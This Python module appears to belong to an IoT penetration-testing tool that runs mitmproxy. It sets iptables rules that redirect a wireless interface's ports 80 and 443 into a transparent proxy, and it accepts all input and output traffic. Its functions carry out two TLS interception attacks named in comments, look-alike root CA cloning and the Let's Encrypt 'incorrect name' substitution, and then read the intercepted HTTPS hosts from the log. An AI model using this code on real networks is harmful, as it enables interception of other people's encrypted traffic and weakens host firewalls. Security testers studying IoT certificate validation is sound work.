#############################################################################
#   Module controls MiTMproxy
#   It is designed to run and control MITMproxy
#############################################################################

#python3 pip3 install mitmproxy
import subprocess
import config
from attacks.mitm import build_cloned_certificates_manager

def setUpIPTablesRedirectionRules(wirelessInterfaceName, routedInterfaceName):
  proc1 = subprocess.run(['sysctl -w net.ipv4.conf.all.send_redirects=0'], stdout=subprocess.PIPE, shell=True, stderr=subprocess.DEVNULL)
  proc2 = subprocess.run(['iptables -t nat -A PREROUTING -i {} -p tcp --dport 80 -j REDIRECT --to-port 8080'.format(wirelessInterfaceName)], stdout=subprocess.PIPE, shell=True, stderr=subprocess.DEVNULL)
  proc3 = subprocess.run(['iptables -t nat -A PREROUTING -i {} -p tcp --dport 443 -j REDIRECT --to-port 8080'.format(wirelessInterfaceName)], stdout=subprocess.PIPE, shell=True, stderr=subprocess.DEVNULL)
  proc4 = subprocess.run(['iptables -t nat -A POSTROUTING -o {} -j MASQUERADE'.format(routedInterfaceName)], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  proc5 = subprocess.run(['iptables -A FORWARD -i {} -o {} -m state --state RELATED,ESTABLISHED -j ACCEPT '.format(routedInterfaceName, wirelessInterfaceName)], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  proc6 = subprocess.run(['iptables -A FORWARD -i {} -o {} -j ACCEPT'.format(wirelessInterfaceName, routedInterfaceName)], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  proc7 = subprocess.run(['iptables -A INPUT -j ACCEPT'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  proc8 = subprocess.run(['iptables -A OUTPUT -j ACCEPT'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

#Start MiTMProxy. This is none blocking and writes to a new file using Python in realtime
def kickOffMiTMProxyDefaultMode(wirelessinterfaceIPAddress, tempfilepath):  
  #proc1 = subprocess.Popen(['mitmdump --mode transparent --listen-host {} --showhost'.format(wirelessinterfaceIPAddress, tempfilepath)], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  with open(tempfilepath, "w") as outfile:
    proc1 = subprocess.Popen(['mitmdump --mode transparent --listen-host {} --showhost'.format(wirelessinterfaceIPAddress)], shell=True, stdout=outfile, stderr=outfile)      
  return proc1

# https://bishopfox.com/blog/breaking-https-in-the-iot
# THE LOOK-ALIKE CA ATTACK - "CLONING THE ROOT OF TRUST"
# Basically we'll take all the DNS names that the IOT has looked for, and grab the root CA details that have signed everything else
# Then we'll clone all of their fields and create a Mitmproxy cert that'll emulate it and try to feed the IOT that
# The hope is that they're validating the CA details but not actually validating the certificate itself.
def kickOffMiTMProxySelfCloneMode(wirelessinterfaceIPAddress, tempfilepath, certAndSiteList):
  stringOfSiteAndCerts = ""
  for tempcertAndSiteList in certAndSiteList:
    stringOfSiteAndCerts = stringOfSiteAndCerts + "--certs " + tempcertAndSiteList[0] + "=" + tempcertAndSiteList[1] + " "
  with open(tempfilepath, "w") as outfile:
    # We include the --ssl-insecure flag as some hosts don't use an SNI which makes MiTMProxy unhappy
    proc1 = subprocess.Popen(['mitmdump --mode transparent --ssl-insecure --listen-host {} --showhost {}'.format(wirelessinterfaceIPAddress, stringOfSiteAndCerts)], shell=True, stdout=outfile, stderr=outfile)
  return proc1

# https://bishopfox.com/blog/breaking-https-in-the-iot
# THE INCORRECT NAME ATTACK - “THE OL’ SWITCHEROO”
# Ok what we're going to do here is first extract all of the DNS names and their IP addresses that the IOT has requested
# Next we're going to use a domain we control and LetsEncrypt will let us issue certificates for
# Next when a TLS session is started by the client asking for TLS on an IP, we will know the DNS name it's really after
# Then we will get LetsEncrypt to issue us a certificate as a subdomain of our domain, so perhaps iotdomain.provider.OUTDOMAIN.COM
# We're hoping that the IOT is just checking for an authenticate root CA and that the certificate it's presented with has the common name
# Of *iotdomain.provider* somewhere (using substring) so it'll accept our certificate.
def kickOffMiTMProxyLetsEncryptCloneMode(wirelessinterfaceIPAddress, tempfilepath, certAndSiteList):
  stringOfSiteAndCerts = ""
  for tempcertAndSiteList in certAndSiteList:
    stringOfSiteAndCerts = stringOfSiteAndCerts + "--certs " + tempcertAndSiteList[0] + "=" + tempcertAndSiteList[1] + " "
  with open(tempfilepath, "w") as outfile:         
    proc1 = subprocess.Popen(['mitmdump --mode transparent --listen-host {} --showhost {}'.format(wirelessinterfaceIPAddress, stringOfSiteAndCerts)], shell=True, stdout=outfile, stderr=outfile)
  return proc1

# https://bishopfox.com/blog/breaking-https-in-the-iot
# THE INCORRECT NAME ATTACK - “THE OL’ SWITCHEROO”
# Ok what we're going to do here is first extract all of the DNS names and their IP addresses that the IOT has requested
# Next we're going to use a domain we control and LetsEncrypt will let us issue certificates for
# Next when a TLS session is started by the client asking for TLS on an IP, we will know the DNS name it's really after
# Then we will get LetsEncrypt to issue us a certificate as a subdomain of our domain, so perhaps iotdomain.provider.OUTDOMAIN.COM
# We're hoping that the IOT is just checking for an authenticate root CA and that the certificate it's presented with has the common name
# Of *iotdomain.provider* somewhere (using substring) so it'll accept our certificate.
def generateAFakeCertificateChainForLetsEncrypt(URIList, tempDirectoryPath):  
  #List to hold doubles of URI/Cert Path
  certAndSiteList = []
  for URI in URIList:
    #Clone the URI into a fake CA/Leaf Cert
    certAndSiteSmallList = build_cloned_certificates_manager.cloneURIUsingLetsEncrypt(URI, tempDirectoryPath)
    if not certAndSiteSmallList == []:
      certAndSiteList.append(certAndSiteSmallList)    
  return certAndSiteList
  
# https://bishopfox.com/blog/breaking-https-in-the-iot
# THE LOOK-ALIKE CA ATTACK - "CLONING THE ROOT OF TRUST"
# Basically we'll take all the DNS names that the IOT has looked for, and grab the root CA details that have signed everything else
# Then we'll clone all of their fields and create a Mitmproxy cert that'll emulate it and try to feed the IOT that
# The hope is that they're validating the CA details but not actually validating the certificate itself.
# Return a 2 dim array of URIs and certificate locations for them
def generateAFakeCertificateChain(URIList, tempDirectoryPath):
  #Download and extract CA certificates
  caDumpDirectoryPath = build_cloned_certificates_manager.downloadAndUnpackCACertificates(tempDirectoryPath)
  
  #List to hold doubles of URI/Cert Path
  certAndSiteList = []
  for URI in URIList:
    #Clone the URI into a fake CA/Leaf Cert
    certAndSiteSmallList = build_cloned_certificates_manager.cloneURI(URI, tempDirectoryPath, caDumpDirectoryPath)
    if not certAndSiteSmallList == []:
      certAndSiteList.append(certAndSiteSmallList)    
  return certAndSiteList


#Get HTTPS Convos that are in the MiTM log, this is blocking
def getHTTPSConvos(tempfilepath):
  httpsSiteList = []
  with open(tempfilepath) as theFile:
    readInTheFile = theFile.readlines()
  for thisLine in readInTheFile:
    #Convert to lowercase
    thisLineLower = thisLine.lower()
    if "https" in thisLineLower:
      websiteSplit = thisLineLower.split()
      httpsSiteList.append(websiteSplit[2])
  return httpsSiteList